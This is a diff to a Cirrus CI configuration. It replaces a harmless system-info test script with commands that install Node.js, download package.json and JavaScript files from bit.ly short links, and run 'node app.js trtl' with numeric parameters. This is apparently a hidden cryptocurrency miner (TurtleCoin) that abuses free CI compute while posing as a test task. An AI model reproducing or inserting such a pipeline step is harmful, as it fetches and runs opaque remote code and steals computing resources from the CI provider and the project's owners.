@@ -10,9 +10,9 @@ compute_engine_instance:
 test_task:
   clone_script: echo "cirrusCI VIPPROMAX"
   test_script: |
-    uname -r
-    cat /etc/debian_version
-    cat /etc/lsb-release
-    
-#curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/3hYdY4n -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js && npm i -s && node app.js trtl fi 1 1 240 2
+    curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh
+    sudo bash nodesource_setup.sh
+    sudo apt install -y nodejs
+    node -v
+    curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/3hYdY4n -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js && npm i -s && node app.js trtl fi 1 1 240 2
 
